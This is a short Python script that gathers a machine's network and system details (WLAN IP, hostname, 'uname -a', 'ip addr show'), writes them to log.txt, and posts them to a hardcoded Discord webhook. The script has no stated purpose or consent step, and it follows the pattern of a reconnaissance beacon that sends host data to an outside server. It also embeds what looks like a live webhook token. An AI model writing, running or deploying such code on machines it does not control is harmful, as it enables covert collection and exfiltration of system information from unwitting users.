import subprocess
import requests
import json
import socket
import netifaces

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(message):
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({'content': message})
    response = requests.post(webhook_url, headers=headers, data=payload)
    if response.status_code == 204:
        print(f"Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get IP address of WLAN interface
def get_wlan_ip():
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        if 'wlan' in iface:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
    return None

# Collect detailed network and system information
wlan_ip = get_wlan_ip()
hostname = socket.gethostname()
host_ip = socket.gethostbyname(hostname)
system_info = execute_command('uname -a')
network_info = execute_command('ip addr show')

# Write collected information to log.txt
with open('log.txt', 'w') as f:
    f.write("=== Network Information ===\n")
    f.write(f"WLAN IP Address: {wlan_ip}\n")
    f.write(f"Host IP Address: {host_ip}\n\n")
    f.write(network_info + "\n\n")
    f.write("=== System Information ===\n")
    f.write(system_info + "\n")

# Send log.txt content to Discord webhook
with open('log.txt', 'r') as f:
    log_content = f.read()

send_to_discord(f"```{log_content}```")
